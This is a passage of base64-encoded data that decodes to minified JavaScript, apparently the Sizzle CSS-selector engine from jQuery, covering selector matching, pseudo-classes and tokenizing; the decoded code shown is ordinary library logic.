FnTmFtZShhKSA6IHZvaWQgMCB9IDogZnVuY3Rpb24gKGEsIGIpIHsgdmFyIGMsIGQgPSBbXSwgZSA9IDAsIGYgPSBiLmdldEVsZW1lbnRzQnlUYWdOYW1lKGEpOyBpZiAoIioiID09PSBhKSB7IHdoaWxlIChjID0gZltlKytdKSAxID09PSBjLm5vZGVUeXBlICYmIGQucHVzaChjKTsgcmV0dXJuIGQgfSByZXR1cm4gZiB9LCBkLmZpbmQuQ0xBU1MgPSBjLmdldEVsZW1lbnRzQnlDbGFzc05hbWUgJiYgZnVuY3Rpb24gKGEsIGIpIHsgcmV0dXJuIHR5cGVvZiBiLmdldEVsZW1lbnRzQnlDbGFzc05hbWUgIT09IEMgJiYgcCA/IGIuZ2V0RWxlbWVudHNCeUNsYXNzTmFtZShhKSA6IHZvaWQgMCB9LCByID0gW10sIHEgPSBbXSwgKGMucXNhID0gJC50ZXN0KGUucXVlcnlTZWxlY3RvckFsbCkpICYmIChpYihmdW5jdGlvbiAoYSkgeyBhLmlubmVySFRNTCA9ICI8c2VsZWN0IG1zYWxsb3djbGlwPScnPjxvcHRpb24gc2VsZWN0ZWQ9Jyc+PC9vcHRpb24+PC9zZWxlY3Q+IiwgYS5xdWVyeVNlbGVjdG9yQWxsKCJbbXNhbGxvd2NsaXBePScnXSIpLmxlbmd0aCAmJiBxLnB1c2goIlsqXiRdPSIgKyBNICsgIiooPzonJ3xcIlwiKSIpLCBhLnF1ZXJ5U2VsZWN0b3JBbGwoIltzZWxlY3RlZF0iKS5sZW5ndGggfHwgcS5wdXNoKCJcXFsiICsgTSArICIqKD86dmFsdWV8IiArIEwgKyAiKSIpLCBhLnF1ZXJ5U2VsZWN0b3JBbGwoIjpjaGVja2VkIikubGVuZ3RoIHx8IHEucHVzaCgiOmNoZWNrZWQiKSB9KSwgaWIoZnVuY3Rpb24gKGEpIHsgdmFyIGIgPSBlLmNyZWF0ZUVsZW1lbnQoImlucHV0Iik7IGIuc2V0QXR0cmlidXRlKCJ0eXBlIiwgImhpZGRlbiIpLCBhLmFwcGVuZENoaWxkKGIpLnNldEF0dHJpYnV0ZSgibmFtZSIsICJEIiksIGEucXVlcnlTZWxlY3RvckFsbCgiW25hbWU9ZF0iKS5sZW5ndGggJiYgcS5wdXNoKCJuYW1lIiArIE0gKyAiKlsqXiR8IX5dPz0iKSwgYS5xdWVyeVNlbGVjdG9yQWxsKCI6ZW5hYmxlZCIpLmxlbmd0aCB8fCBxLnB1c2goIjplbmFibGVkIiwgIjpkaXNhYmxlZCIpLCBhLnF1ZXJ5U2VsZWN0b3JBbGwoIiosOngiKSwgcS5wdXNoKCIsLio6IikgfSkpLCAoYy5tYXRjaGVzU2VsZWN0b3IgPSAkLnRlc3QocyA9IG8ubWF0Y2hlcyB8fCBvLndlYmtpdE1hdGNoZXNTZWxlY3RvciB8fCBvLm1vek1hdGNoZXNTZWxlY3RvciB8fCBvLm9NYXRjaGVzU2VsZWN0b3IgfHwgby5tc01hdGNoZXNTZWxlY3RvcikpICYmIGliKGZ1bmN0aW9uIChhKSB7IGMuZGlzY29ubmVjdGVkTWF0Y2ggPSBzLmNhbGwoYSwgImRpdiIpLCBzLmNhbGwoYSwgIltzIT0nJ106eCIpLCByLnB1c2goIiE9IiwgUSkgfSksIHEgPSBxLmxlbmd0aCAmJiBuZXcgUmVnRXhwKHEuam9pbigifCIpKSwgciA9IHIubGVuZ3RoICYmIG5ldyBSZWdFeHAoci5qb2luKCJ8IikpLCBiID0gJC50ZXN0KG8uY29tcGFyZURvY3VtZW50UG9zaXRpb24pLCB0ID0gYiB8fCAkLnRlc3Qoby5jb250YWlucykgPyBmdW5jdGlvbiAoYSwgYikgeyB2YXIgYyA9IDkgPT09IGEubm9kZVR5cGUgPyBhLmRvY3VtZW50RWxlbWVudCA6IGEsIGQgPSBiICYmIGIucGFyZW50Tm9kZTsgcmV0dXJuIGEgPT09IGQgfHwgISghZCB8fCAxICE9PSBkLm5vZGVUeXBlIHx8ICEoYy5jb250YWlucyA/IGMuY29udGFpbnMoZCkgOiBhLmNvbXBhcmVEb2N1bWVudFBvc2l0aW9uICYmIDE2ICYgYS5jb21wYXJlRG9jdW1lbnRQb3NpdGlvbihkKSkpIH0gOiBmdW5jdGlvbiAoYSwgYikgeyBpZiAoYikgd2hpbGUgKGIgPSBiLnBhcmVudE5vZGUpIGlmIChiID09PSBhKSByZXR1cm4gITA7IHJldHVybiAhMSB9LCBCID0gYiA/IGZ1bmN0aW9uIChhLCBiKSB7IGlmIChhID09PSBiKSByZXR1cm4gbCA9ICEwLCAwOyB2YXIgZCA9ICFhLmNvbXBhcmVEb2N1bWVudFBvc2l0aW9uIC0gIWIuY29tcGFyZURvY3VtZW50UG9zaXRpb247IHJldHVybiBkID8gZCA6IChkID0gKGEub3duZXJEb2N1bWVudCB8fCBhKSA9PT0gKGIub3duZXJEb2N1bWVudCB8fCBiKSA/IGEuY29tcGFyZURvY3VtZW50UG9zaXRpb24oYikgOiAxLCAxICYgZCB8fCAhYy5zb3J0RGV0YWNoZWQgJiYgYi5jb21wYXJlRG9jdW1lbnRQb3NpdGlvbihhKSA9PT0gZCA/IGEgPT09IGUgfHwgYS5vd25lckRvY3VtZW50ID09PSB2ICYmIHQodiwgYSkgPyAtMSA6IGIgPT09IGUgfHwgYi5vd25lckRvY3VtZW50ID09PSB2ICYmIHQodiwgYikgPyAxIDogayA/IEsuY2FsbChrLCBhKSAtIEsuY2FsbChrLCBiKSA6IDAgOiA0ICYgZCA/IC0xIDogMSkgfSA6IGZ1bmN0aW9uIChhLCBiKSB7IGlmIChhID09PSBiKSByZXR1cm4gbCA9ICEwLCAwOyB2YXIgYywgZCA9IDAsIGYgPSBhLnBhcmVudE5vZGUsIGcgPSBiLnBhcmVudE5vZGUsIGggPSBbYV0sIGkgPSBbYl07IGlmICghZiB8fCAhZykgcmV0dXJuIGEgPT09IGUgPyAtMSA6IGIgPT09IGUgPyAxIDogZiA/IC0xIDogZyA/IDEgOiBrID8gSy5jYWxsKGssIGEpIC0gSy5jYWxsKGssIGIpIDogMDsgaWYgKGYgPT09IGcpIHJldHVybiBrYihhLCBiKTsgYyA9IGE7IHdoaWxlIChjID0gYy5wYXJlbnROb2RlKSBoLnVuc2hpZnQoYyk7IGMgPSBiOyB3aGlsZSAoYyA9IGMucGFyZW50Tm9kZSkgaS51bnNoaWZ0KGMpOyB3aGlsZSAoaFtkXSA9PT0gaVtkXSkgZCsrOyByZXR1cm4gZCA/IGtiKGhbZF0sIGlbZF0pIDogaFtkXSA9PT0gdiA/IC0xIDogaVtkXSA9PT0gdiA/IDEgOiAwIH0sIGUpIDogbiB9LCBmYi5tYXRjaGVzID0gZnVuY3Rpb24gKGEsIGIpIHsgcmV0dXJuIGZiKGEsIG51bGwsIG51bGwsIGIpIH0sIGZiLm1hdGNoZXNTZWxlY3RvciA9IGZ1bmN0aW9uIChhLCBiKSB7IGlmICgoYS5vd25lckRvY3VtZW50IHx8IGEpICE9PSBuICYmIG0oYSksIGIgPSBiLnJlcGxhY2UoVSwgIj0nJDEnXSIpLCAhKCFjLm1hdGNoZXNTZWxlY3RvciB8fCAhcCB8fCByICYmIHIudGVzdChiKSB8fCBxICYmIHEudGVzdChiKSkpIHRyeSB7IHZhciBkID0gcy5jYWxsKGEsIGIpOyBpZiAoZCB8fCBjLmRpc2Nvbm5lY3RlZE1hdGNoIHx8IGEuZG9jdW1lbnQgJiYgMTEgIT09IGEuZG9jdW1lbnQubm9kZVR5cGUpIHJldHVybiBkIH0gY2F0Y2ggKGUpIHsgfSByZXR1cm4gZmIoYiwgbiwgbnVsbCwgW2FdKS5sZW5ndGggPiAwIH0sIGZiLmNvbnRhaW5zID0gZnVuY3Rpb24gKGEsIGIpIHsgcmV0dXJuIChhLm93bmVyRG9jdW1lbnQgfHwgYSkgIT09IG4gJiYgbShhKSwgdChhLCBiKSB9LCBmYi5hdHRyID0gZnVuY3Rpb24gKGEsIGIpIHsgKGEub3duZXJEb2N1bWVudCB8fCBhKSAhPT0gbiAmJiBtKGEpOyB2YXIgZSA9IGQuYXR0ckhhbmRsZVtiLnRvTG93ZXJDYXNlKCldLCBmID0gZSAmJiBFLmNhbGwoZC5hdHRySGFuZGxlLCBiLnRvTG93ZXJDYXNlKCkpID8gZShhLCBiLCAhcCkgOiB2b2lkIDA7IHJldHVybiB2b2lkIDAgIT09IGYgPyBmIDogYy5hdHRyaWJ1dGVzIHx8ICFwID8gYS5nZXRBdHRyaWJ1dGUoYikgOiAoZiA9IGEuZ2V0QXR0cmlidXRlTm9kZShiKSkgJiYgZi5zcGVjaWZpZWQgPyBmLnZhbHVlIDogbnVsbCB9LCBmYi5lcnJvciA9IGZ1bmN0aW9uIChhKSB7IHRocm93IG5ldyBFcnJvcigiU3ludGF4IGVycm9yLCB1bnJlY29nbml6ZWQgZXhwcmVzc2lvbjogIiArIGEpIH0sIGZiLnVuaXF1ZVNvcnQgPSBmdW5jdGlvbiAoYSkgeyB2YXIgYiwgZCA9IFtdLCBlID0gMCwgZiA9IDA7IGlmIChsID0gIWMuZGV0ZWN0RHVwbGljYXRlcywgayA9ICFjLnNvcnRTdGFibGUgJiYgYS5zbGljZSgwKSwgYS5zb3J0KEIpLCBsKSB7IHdoaWxlIChiID0gYVtmKytdKSBiID09PSBhW2ZdICYmIChlID0gZC5wdXNoKGYpKTsgd2hpbGUgKGUtLSkgYS5zcGxpY2UoZFtlXSwgMSkgfSByZXR1cm4gayA9IG51bGwsIGEgfSwgZSA9IGZiLmdldFRleHQgPSBmdW5jdGlvbiAoYSkgeyB2YXIgYiwgYyA9ICIiLCBkID0gMCwgZiA9IGEubm9kZVR5cGU7IGlmIChmKSB7IGlmICgxID09PSBmIHx8IDkgPT09IGYgfHwgMTEgPT09IGYpIHsgaWYgKCJzdHJpbmciID09IHR5cGVvZiBhLnRleHRDb250ZW50KSByZXR1cm4gYS50ZXh0Q29udGVudDsgZm9yIChhID0gYS5maXJzdENoaWxkOyBhOyBhID0gYS5uZXh0U2libGluZykgYyArPSBlKGEpIH0gZWxzZSBpZiAoMyA9PT0gZiB8fCA0ID09PSBmKSByZXR1cm4gYS5ub2RlVmFsdWUgfSBlbHNlIHdoaWxlIChiID0gYVtkKytdKSBjICs9IGUoYik7IHJldHVybiBjIH0sIGQgPSBmYi5zZWxlY3RvcnMgPSB7IGNhY2hlTGVuZ3RoOiA1MCwgY3JlYXRlUHNldWRvOiBoYiwgbWF0Y2g6IFgsIGF0dHJIYW5kbGU6IHt9LCBmaW5kOiB7fSwgcmVsYXRpdmU6IHsgIj4iOiB7IGRpcjogInBhcmVudE5vZGUiLCBmaXJzdDogITAgfSwgIiAiOiB7IGRpcjogInBhcmVudE5vZGUiIH0sICIrIjogeyBkaXI6ICJwcmV2aW91c1NpYmxpbmciLCBmaXJzdDogITAgfSwgIn4iOiB7IGRpcjogInByZXZpb3VzU2libGluZyIgfSB9LCBwcmVGaWx0ZXI6IHsgQVRUUjogZnVuY3Rpb24gKGEpIHsgcmV0dXJuIGFbMV0gPSBhWzFdLnJlcGxhY2UoY2IsIGRiKSwgYVszXSA9IChhWzNdIHx8IGFbNF0gfHwgYVs1XSB8fCAiIikucmVwbGFjZShjYiwgZGIpLCAifj0iID09PSBhWzJdICYmIChhWzNdID0gIiAiICsgYVszXSArICIgIiksIGEuc2xpY2UoMCwgNCkgfSwgQ0hJTEQ6IGZ1bmN0aW9uIChhKSB7IHJldHVybiBhWzFdID0gYVsxXS50b0xvd2VyQ2FzZSgpLCAibnRoIiA9PT0gYVsxXS5zbGljZSgwLCAzKSA/IChhWzNdIHx8IGZiLmVycm9yKGFbMF0pLCBhWzRdID0gKyhhWzRdID8gYVs1XSArIChhWzZdIHx8IDEpIDogMiAqICgiZXZlbiIgPT09IGFbM10gfHwgIm9kZCIgPT09IGFbM10pKSwgYVs1XSA9ICsoYVs3XSArIGFbOF0gfHwgIm9kZCIgPT09IGFbM10pKSA6IGFbM10gJiYgZmIuZXJyb3IoYVswXSksIGEgfSwgUFNFVURPOiBmdW5jdGlvbiAoYSkgeyB2YXIgYiwgYyA9ICFhWzZdICYmIGFbMl07IHJldHVybiBYLkNISUxELnRlc3QoYVswXSkgPyBudWxsIDogKGFbM10gPyBhWzJdID0gYVs0XSB8fCBhWzVdIHx8ICIiIDogYyAmJiBWLnRlc3QoYykgJiYgKGIgPSBnKGMsICEwKSkgJiYgKGIgPSBjLmluZGV4T2YoIikiLCBjLmxlbmd0aCAtIGIpIC0gYy5sZW5ndGgpICYmIChhWzBdID0gYVswXS5zbGljZSgwLCBiKSwgYVsyXSA9IGMuc2xpY2UoMCwgYikpLCBhLnNsaWNlKDAsIDMpKSB9IH0sIGZpbHRlcjogeyBUQUc6IGZ1bmN0aW9uIChhKSB7IHZhciBiID0gYS5yZXBsYWNlKGNiLCBkYikudG9Mb3dlckNhc2UoKTsgcmV0dXJuICIqIiA9PT0gYSA/IGZ1bmN0aW9uICgpIHsgcmV0dXJuICEwIH0gOiBmdW5jdGlvbiAoYSkgeyByZXR1cm4gYS5ub2RlTmFtZSAmJiBhLm5vZGVOYW1lLnRvTG93ZXJDYXNlKCkgPT09IGIgfSB9LCBDTEFTUzogZnVuY3Rpb24gKGEpIHsgdmFyIGIgPSB5W2EgKyAiICJdOyByZXR1cm4gYiB8fCAoYiA9IG5ldyBSZWdFeHAoIihefCIgKyBNICsgIikiICsgYSArICIoIiArIE0gKyAifCQpIikpICYmIHkoYSwgZnVuY3Rpb24gKGEpIHsgcmV0dXJuIGIudGVzdCgic3RyaW5nIiA9PSB0eXBlb2YgYS5jbGFzc05hbWUgJiYgYS5jbGFzc05hbWUgfHwgdHlwZW9mIGEuZ2V0QXR0cmlidXRlICE9PSBDICYmIGEuZ2V0QXR0cmlidXRlKCJjbGFzcyIpIHx8ICIiKSB9KSB9LCBBVFRSOiBmdW5jdGlvbiAoYSwgYiwgYykgeyByZXR1cm4gZnVuY3Rpb24gKGQpIHsgdmFyIGUgPSBmYi5hdHRyKGQsIGEpOyByZXR1cm4gbnVsbCA9PSBlID8gIiE9IiA9PT0gYiA6IGIgPyAoZSArPSAiIiwgIj0iID09PSBiID8gZSA9PT0gYyA6ICIhPSIgPT09IGIgPyBlICE9PSBjIDogIl49IiA9PT0gYiA/IGMgJiYgMCA9PT0gZS5pbmRleE9mKGMpIDogIio9IiA9PT0gYiA/IGMgJiYgZS5pbmRleE9mKGMpID4gLTEgOiAiJD0iID09PSBiID8gYyAmJiBlLnNsaWNlKC1jLmxlbmd0aCkgPT09IGMgOiAifj0iID09PSBiID8gKCIgIiArIGUgKyAiICIpLmluZGV4T2YoYykgPiAtMSA6ICJ8PSIgPT09IGIgPyBlID09PSBjIHx8IGUuc2xpY2UoMCwgYy5sZW5ndGggKyAxKSA9PT0gYyArICItIiA6ICExKSA6ICEwIH0gfSwgQ0hJTEQ6IGZ1bmN0aW9uIChhLCBiLCBjLCBkLCBlKSB7IHZhciBmID0gIm50aCIgIT09IGEuc2xpY2UoMCwgMyksIGcgPSAibGFzdCIgIT09IGEuc2xpY2UoLTQpLCBoID0gIm9mLXR5cGUiID09PSBiOyByZXR1cm4gMSA9PT0gZCAmJiAwID09PSBlID8gZnVuY3Rpb24gKGEpIHsgcmV0dXJuICEhYS5wYXJlbnROb2RlIH0gOiBmdW5jdGlvbiAoYiwgYywgaSkgeyB2YXIgaiwgaywgbCwgbSwgbiwgbywgcCA9IGYgIT09IGcgPyAibmV4dFNpYmxpbmciIDogInByZXZpb3VzU2libGluZyIsIHEgPSBiLnBhcmVudE5vZGUsIHIgPSBoICYmIGIubm9kZU5hbWUudG9Mb3dlckNhc2UoKSwgcyA9ICFpICYmICFoOyBpZiAocSkgeyBpZiAoZikgeyB3aGlsZSAocCkgeyBsID0gYjsgd2hpbGUgKGwgPSBsW3BdKSBpZiAoaCA/IGwubm9kZU5hbWUudG9Mb3dlckNhc2UoKSA9PT0gciA6IDEgPT09IGwubm9kZVR5cGUpIHJldHVybiAhMTsgbyA9IHAgPSAib25seSIgPT09IGEgJiYgIW8gJiYgIm5leHRTaWJsaW5nIiB9IHJldHVybiAhMCB9IGlmIChvID0gW2cgPyBxLmZpcnN0Q2hpbGQgOiBxLmxhc3RDaGlsZF0sIGcgJiYgcykgeyBrID0gcVt1XSB8fCAocVt1XSA9IHt9KSwgaiA9IGtbYV0gfHwgW10sIG4gPSBqWzBdID09PSB3ICYmIGpbMV0sIG0gPSBqWzBdID09PSB3ICYmIGpbMl0sIGwgPSBuICYmIHEuY2hpbGROb2Rlc1tuXTsgd2hpbGUgKGwgPSArK24gJiYgbCAmJiBsW3BdIHx8IChtID0gbiA9IDApIHx8IG8ucG9wKCkpIGlmICgxID09PSBsLm5vZGVUeXBlICYmICsrbSAmJiBsID09PSBiKSB7IGtbYV0gPSBbdywgbiwgbV07IGJyZWFrIH0gfSBlbHNlIGlmIChzICYmIChqID0gKGJbdV0gfHwgKGJbdV0gPSB7fSkpW2FdKSAmJiBqWzBdID09PSB3KSBtID0galsxXTsgZWxzZSB3aGlsZSAobCA9ICsrbiAmJiBsICYmIGxbcF0gfHwgKG0gPSBuID0gMCkgfHwgby5wb3AoKSkgaWYgKChoID8gbC5ub2RlTmFtZS50b0xvd2VyQ2FzZSgpID09PSByIDogMSA9PT0gbC5ub2RlVHlwZSkgJiYgKyttICYmIChzICYmICgobFt1XSB8fCAobFt1XSA9IHt9KSlbYV0gPSBbdywgbV0pLCBsID09PSBiKSkgYnJlYWs7IHJldHVybiBtIC09IGUsIG0gPT09IGQgfHwgbSAlIGQgPT09IDAgJiYgbSAvIGQgPj0gMCB9IH0gfSwgUFNFVURPOiBmdW5jdGlvbiAoYSwgYikgeyB2YXIgYywgZSA9IGQucHNldWRvc1thXSB8fCBkLnNldEZpbHRlcnNbYS50b0xvd2VyQ2FzZSgpXSB8fCBmYi5lcnJvcigidW5zdXBwb3J0ZWQgcHNldWRvOiAiICsgYSk7IHJldHVybiBlW3VdID8gZShiKSA6IGUubGVuZ3RoID4gMSA/IChjID0gW2EsIGEsICIiLCBiXSwgZC5zZXRGaWx0ZXJzLmhhc093blByb3BlcnR5KGEudG9Mb3dlckNhc2UoKSkgPyBoYihmdW5jdGlvbiAoYSwgYykgeyB2YXIgZCwgZiA9IGUoYSwgYiksIGcgPSBmLmxlbmd0aDsgd2hpbGUgKGctLSkgZCA9IEsuY2FsbChhLCBmW2ddKSwgYVtkXSA9ICEoY1tkXSA9IGZbZ10pIH0pIDogZnVuY3Rpb24gKGEpIHsgcmV0dXJuIGUoYSwgMCwgYykgfSkgOiBlIH0gfSwgcHNldWRvczogeyBub3Q6IGhiKGZ1bmN0aW9uIChhKSB7IHZhciBiID0gW10sIGMgPSBbXSwgZCA9IGgoYS5yZXBsYWNlKFIsICIkMSIpKTsgcmV0dXJuIGRbdV0gPyBoYihmdW5jdGlvbiAoYSwgYiwgYywgZSkgeyB2YXIgZiwgZyA9IGQoYSwgbnVsbCwgZSwgW10pLCBoID0gYS5sZW5ndGg7IHdoaWxlIChoLS0pIChmID0gZ1toXSkgJiYgKGFbaF0gPSAhKGJbaF0gPSBmKSkgfSkgOiBmdW5jdGlvbiAoYSwgZSwgZikgeyByZXR1cm4gYlswXSA9IGEsIGQoYiwgbnVsbCwgZiwgYyksICFjLnBvcCgpIH0gfSksIGhhczogaGIoZnVuY3Rpb24gKGEpIHsgcmV0dXJuIGZ1bmN0aW9uIChiKSB7IHJldHVybiBmYihhLCBiKS5sZW5ndGggPiAwIH0gfSksIGNvbnRhaW5zOiBoYihmdW5jdGlvbiAoYSkgeyByZXR1cm4gZnVuY3Rpb24gKGIpIHsgcmV0dXJuIChiLnRleHRDb250ZW50IHx8IGIuaW5uZXJUZXh0IHx8IGUoYikpLmluZGV4T2YoYSkgPiAtMSB9IH0pLCBsYW5nOiBoYihmdW5jdGlvbiAoYSkgeyByZXR1cm4gVy50ZXN0KGEgfHwgIiIpIHx8IGZiLmVycm9yKCJ1bnN1cHBvcnRlZCBsYW5nOiAiICsgYSksIGEgPSBhLnJlcGxhY2UoY2IsIGRiKS50b0xvd2VyQ2FzZSgpLCBmdW5jdGlvbiAoYikgeyB2YXIgYzsgZG8gaWYgKGMgPSBwID8gYi5sYW5nIDogYi5nZXRBdHRyaWJ1dGUoInhtbDpsYW5nIikgfHwgYi5nZXRBdHRyaWJ1dGUoImxhbmciKSkgcmV0dXJuIGMgPSBjLnRvTG93ZXJDYXNlKCksIGMgPT09IGEgfHwgMCA9PT0gYy5pbmRleE9mKGEgKyAiLSIpOyB3aGlsZSAoKGIgPSBiLnBhcmVudE5vZGUpICYmIDEgPT09IGIubm9kZVR5cGUpOyByZXR1cm4gITEgfSB9KSwgdGFyZ2V0OiBmdW5jdGlvbiAoYikgeyB2YXIgYyA9IGEubG9jYXRpb24gJiYgYS5sb2NhdGlvbi5oYXNoOyByZXR1cm4gYyAmJiBjLnNsaWNlKDEpID09PSBiLmlkIH0sIHJvb3Q6IGZ1bmN0aW9uIChhKSB7IHJldHVybiBhID09PSBvIH0sIGZvY3VzOiBmdW5jdGlvbiAoYSkgeyByZXR1cm4gYSA9PT0gbi5hY3RpdmVFbGVtZW50ICYmICghbi5oYXNGb2N1cyB8fCBuLmhhc0ZvY3VzKCkpICYmICEhKGEudHlwZSB8fCBhLmhyZWYgfHwgfmEudGFiSW5kZXgpIH0sIGVuYWJsZWQ6IGZ1bmN0aW9uIChhKSB7IHJldHVybiBhLmRpc2FibGVkID09PSAhMSB9LCBkaXNhYmxlZDogZnVuY3Rpb24gKGEpIHsgcmV0dXJuIGEuZGlzYWJsZWQgPT09ICEwIH0sIGNoZWNrZWQ6IGZ1bmN0aW9uIChhKSB7IHZhciBiID0gYS5ub2RlTmFtZS50b0xvd2VyQ2FzZSgpOyByZXR1cm4gImlucHV0IiA9PT0gYiAmJiAhIWEuY2hlY2tlZCB8fCAib3B0aW9uIiA9PT0gYiAmJiAhIWEuc2VsZWN0ZWQgfSwgc2VsZWN0ZWQ6IGZ1bmN0aW9uIChhKSB7IHJldHVybiBhLnBhcmVudE5vZGUgJiYgYS5wYXJlbnROb2RlLnNlbGVjdGVkSW5kZXgsIGEuc2VsZWN0ZWQgPT09ICEwIH0sIGVtcHR5OiBmdW5jdGlvbiAoYSkgeyBmb3IgKGEgPSBhLmZpcnN0Q2hpbGQ7IGE7IGEgPSBhLm5leHRTaWJsaW5nKSBpZiAoYS5ub2RlVHlwZSA8IDYpIHJldHVybiAhMTsgcmV0dXJuICEwIH0sIHBhcmVudDogZnVuY3Rpb24gKGEpIHsgcmV0dXJuICFkLnBzZXVkb3MuZW1wdHkoYSkgfSwgaGVhZGVyOiBmdW5jdGlvbiAoYSkgeyByZXR1cm4gWi50ZXN0KGEubm9kZU5hbWUpIH0sIGlucHV0OiBmdW5jdGlvbiAoYSkgeyByZXR1cm4gWS50ZXN0KGEubm9kZU5hbWUpIH0sIGJ1dHRvbjogZnVuY3Rpb24gKGEpIHsgdmFyIGIgPSBhLm5vZGVOYW1lLnRvTG93ZXJDYXNlKCk7IHJldHVybiAiaW5wdXQiID09PSBiICYmICJidXR0b24iID09PSBhLnR5cGUgfHwgImJ1dHRvbiIgPT09IGIgfSwgdGV4dDogZnVuY3Rpb24gKGEpIHsgdmFyIGI7IHJldHVybiAiaW5wdXQiID09PSBhLm5vZGVOYW1lLnRvTG93ZXJDYXNlKCkgJiYgInRleHQiID09PSBhLnR5cGUgJiYgKG51bGwgPT0gKGIgPSBhLmdldEF0dHJpYnV0ZSgidHlwZSIpKSB8fCAidGV4dCIgPT09IGIudG9Mb3dlckNhc2UoKSkgfSwgZmlyc3Q6IG5iKGZ1bmN0aW9uICgpIHsgcmV0dXJuIFswXSB9KSwgbGFzdDogbmIoZnVuY3Rpb24gKGEsIGIpIHsgcmV0dXJuIFtiIC0gMV0gfSksIGVxOiBuYihmdW5jdGlvbiAoYSwgYiwgYykgeyByZXR1cm4gWzAgPiBjID8gYyArIGIgOiBjXSB9KSwgZXZlbjogbmIoZnVuY3Rpb24gKGEsIGIpIHsgZm9yICh2YXIgYyA9IDA7IGIgPiBjOyBjICs9IDIpIGEucHVzaChjKTsgcmV0dXJuIGEgfSksIG9kZDogbmIoZnVuY3Rpb24gKGEsIGIpIHsgZm9yICh2YXIgYyA9IDE7IGIgPiBjOyBjICs9IDIpIGEucHVzaChjKTsgcmV0dXJuIGEgfSksIGx0OiBuYihmdW5jdGlvbiAoYSwgYiwgYykgeyBmb3IgKHZhciBkID0gMCA+IGMgPyBjICsgYiA6IGM7IC0tZCA+PSAwOykgYS5wdXNoKGQpOyByZXR1cm4gYSB9KSwgZ3Q6IG5iKGZ1bmN0aW9uIChhLCBiLCBjKSB7IGZvciAodmFyIGQgPSAwID4gYyA/IGMgKyBiIDogYzsgKytkIDwgYjspIGEucHVzaChkKTsgcmV0dXJuIGEgfSkgfSB9LCBkLnBzZXVkb3MubnRoID0gZC5wc2V1ZG9zLmVxOyBmb3IgKGIgaW4geyByYWRpbzogITAsIGNoZWNrYm94OiAhMCwgZmlsZTogITAsIHBhc3N3b3JkOiAhMCwgaW1hZ2U6ICEwIH0pIGQucHNldWRvc1tiXSA9IGxiKGIpOyBmb3IgKGIgaW4geyBzdWJtaXQ6ICEwLCByZXNldDogITAgfSkgZC5wc2V1ZG9zW2JdID0gbWIoYik7IGZ1bmN0aW9uIHBiKCkgeyB9IHBiLnByb3RvdHlwZSA9IGQuZmlsdGVycyA9IGQucHNldWRvcywgZC5zZXRGaWx0ZXJzID0gbmV3IHBiLCBnID0gZmIudG9rZW5pemUgPSBmdW5jdGlvbiAoYSwgYikgeyB2YXIgYywgZSwgZiwgZywgaCwgaSwgaiwgayA9IHpbYSArICIgIl07IGlmIChrKSByZXR1cm4gYiA/IDAgOiBrLnNsaWNlKDApOyBoID0gYSwgaSA9IFtdLCBqID0gZC5wcmVGaWx0ZXI7IHdoaWxlIChoKSB7ICghYyB8fCAoZSA9IFMuZXhlYyhoKSkpICYmIChlICYmIChoID0gaC5zbGljZShlWzBdLmxlbmd0aCkgfHwgaCksIGkucHVzaChmID0gW10pKSwgYyA9ICExLCAoZSA9IFQuZXhlYyhoKSkgJiYgKGMgPSBlLnNoaWZ0KCksIGYucHVzaCh7IHZhbHVlOiBjLCB0eXBlOiBlWzBdLnJlcGxhY2UoUiwgIiAiKSB9KSwgaCA9IGguc2xpY2UoYy5sZW5ndGgpKTsgZm9yIChnIGluIGQuZmlsdGVyKSAhKGUgPSBYW2ddLmV4ZWMoaCkpIHx8IGpbZ10gJiYgIShlID0galtnXShlKSkgfHwgKGMgPSBlLnNoaWZ0KCksIGYucHVzaCh7IHZhbHVlOiBjLCB0eXBlOiBnLCBtYXRjaGVzOiBlIH0pLCBoID0gaC5zbGljZShjLmxlbmd0aCkpOyBpZiAoIWMpIGJyZWFrIH0gcmV0dXJuIGIgPyBoLmxlbmd0aCA6IGggPyBmYi5lcnJvcihhKSA6IHooYSwgaSkuc2xpY2UoMCkgfTsgZnVuY3Rpb24gcWIoYSkgeyBmb3IgKHZhciBiID0gMCwgYyA9IGEubGVuZ3RoLCBkID0gIiI7IGMgPiBiOyBiKyspIGQgKz0gYVtiXS52YWx1ZTsgcmV0dXJuIGQgfSBmdW5jdGlvbiByYihhLCBiLCBjKSB7IHZhciBkID0gYi5kaXIsIGUgPSBjICYmICJwYXJlbnROb2RlIiA9PT0gZCwgZiA9IHgrKzsgcmV0dXJuIGIuZmlyc3QgPyBmdW5jdGlvbiAoYiwgYywgZikgeyB3aGlsZSAoYiA9IGJbZF0pIGlmICgxID09PSBiLm5vZGVUeXBlIHx8IGUpIHJldHVybiBhKGIsIGMsIGYpIH0gOiBmdW5jdGlvbiAoYiwgYywgZykgeyB2YXIgaCwgaSwgaiA9IFt3LCBmXTsgaWYgKGcpIHsgd2hpbGUgKGIgPSBiW2RdKSBpZiAoKDEgPT09IGIubm9kZVR5cGUgfHwgZSkgJiYgYShiLCBjLCBnKSkgcmV0dXJuICEwIH0gZWxzZSB3aGlsZSAoYiA9IGJbZF0pIGlmICgxID09PSBiLm5vZGVUeXBlIHx8IGUpIHsgaWYgKGkgPSBiW3VdIHx8IChiW3VdID0ge30pLCAoaCA9IGlbZF0pICYmIGhbMF0gPT09IHcgJiYgaFsxXSA9PT0gZikgcmV0dXJuIGpbMl0gPSBoWzJdOyBpZiAoaVtkXSA9IGosIGpbMl0gPSBhKGIsIGMsIGcpKSByZXR1cm4gITAgfSB9IH0gZnVuY3Rpb24gc2IoYSkgeyByZXR1cm4gYS5sZW5ndGggPiAxID8gZnVuY3Rpb24gKGIsIGMsIGQpIHsgdmFyIGUgPSBhLmxlbmd0aDsgd2hpbGUgKGUtLSkgaWYgKCFhW2VdKGIsIGMsIGQpKSByZXR1cm4gITE7IHJldHVybiAhMCB9IDogYVswXSB9IGZ1bmN0aW9uIHRiKGEsIGIsIGMpIHsgZm9yICh2YXIgZCA9IDAsIGUgPSBiLmxlbmd0aDsgZSA+IGQ7IGQrKykgZmIoYSwgYltkXSwgYyk7IHJldHVybiBjIH0gZnVuY3Rpb24gdWIoYSwgYiwgYywgZCwgZSkgeyBmb3IgKHZhciBmLCBnID0gW10sIGggPSAwLCBpID0gYS5sZW5ndGgsIGogPSBudWxsICE9IGI7IGkgPiBoOyBoKyspIChmID0gYVtoXSkgJiYgKCFjIHx8IGMoZiwgZCwgZSkpICYmIChnLnB1c2goZiksIGogJiYgYi5wdXNoKGgpKTsgcmV0dXJuIGcgfSBmdW5jdGlvbiB2YihhLCBiLCBjLCBkLCBlLCBmKSB7IHJldHVybiBkICYmICFkW3VdICYmIChkID0gdmIoZCkpLCBlICYmICFlW3V